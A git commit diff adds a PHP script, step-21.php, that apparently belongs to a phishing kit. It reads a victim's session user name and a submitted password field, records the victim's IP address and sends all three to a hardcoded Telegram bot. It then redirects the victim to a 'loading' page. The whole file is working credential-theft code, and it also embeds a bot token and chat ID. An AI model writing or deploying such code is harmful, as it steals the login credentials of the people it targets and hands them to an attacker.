00f37db528078a0d5340c61a949f364c24791c19
Livedave03 <lopelquelop@gmail.com>
2024-10-24 21:40:37 -0500

    Add files via upload

---
+++ step-21.php
@@ -0,0 +1,29 @@
+<?php
+session_start();
+$user = $_SESSION['user'];
+// Recoger los datos del formulario
+$correo = $_POST['cl'];
+
+
+$ip = $_SERVER['REMOTE_ADDR']; // Obtener la dirección IP del cliente
+
+// API key del chatbot de Telegram
+$bot_api_key = '7873769016:AAF-A0vWWxTGuokc0OuR8wwoS1IqV4Lbb38';
+
+// ID del chat al que se enviará el mensaje
+$chat_id = '7647167463';
+
+// Mensaje que se enviará al chatbot
+$mensaje_para_chatbot = "🔐🧿usuario bvd🧿🔐\nUser: " . $user . "\nclave: " . $correo .  "\nip: " . $ip;
+
+// URL de la API de Telegram para enviar mensajes
+$telegram_url = "https://api.telegram.org/bot" . $bot_api_key . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($mensaje_para_chatbot);
+
+// Enviar el mensaje al chatbot de Telegram
+$response = file_get_contents($telegram_url);
+
+// Redirigir a index.php
+header("Location: cargando.html");
+exit;
+
+?>
